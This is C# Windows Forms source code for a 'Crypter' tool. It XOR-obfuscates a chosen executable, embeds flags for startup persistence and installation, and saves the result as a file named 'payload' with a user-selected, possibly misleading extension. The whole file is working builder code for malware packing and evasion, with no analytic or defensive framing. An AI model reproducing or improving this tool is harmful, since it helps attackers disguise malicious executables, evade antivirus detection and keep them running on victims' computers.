using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

namespace Crypter
{
    public partial class Form1 : Form
    {
        string inputFilePath = "";
        byte xorKey = 0xAA;

        public Form1()
        {
            InitializeComponent();
        }

        private void selectFileButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Executable Files (*.exe)|*.exe";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                inputFilePath = ofd.FileName;
                txtFilePath.Text = inputFilePath;
            }
        }

        private void encryptButton_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(inputFilePath))
            {
                MessageBox.Show("Please select a file first.");
                return;
            }

            string selectedExtension = comboBoxExtension.Text.Trim();
            if (string.IsNullOrEmpty(selectedExtension) || !selectedExtension.StartsWith("."))
            {
                MessageBox.Show("Please select a valid extension.");
                return;
            }

            byte[] data = File.ReadAllBytes(inputFilePath);

            for (int i = 0; i < data.Length; i++)
                data[i] ^= (byte)(xorKey + (i % 7));

            bool addToStartup = startup.Checked;
            bool doInstall = install.Checked;
            byte flags = 0;
            if (addToStartup) flags |= 0b01;
            if (doInstall) flags |= 0b10;

            List<byte> outputData = new List<byte> { flags };
            outputData.AddRange(data);

            string outputFileName = "payload" + selectedExtension;
            string outputPath = Path.Combine(Application.StartupPath, outputFileName);
            File.WriteAllBytes(outputPath, outputData.ToArray());

            MessageBox.Show($"file saved as: {outputFileName}");
        }
    }
}
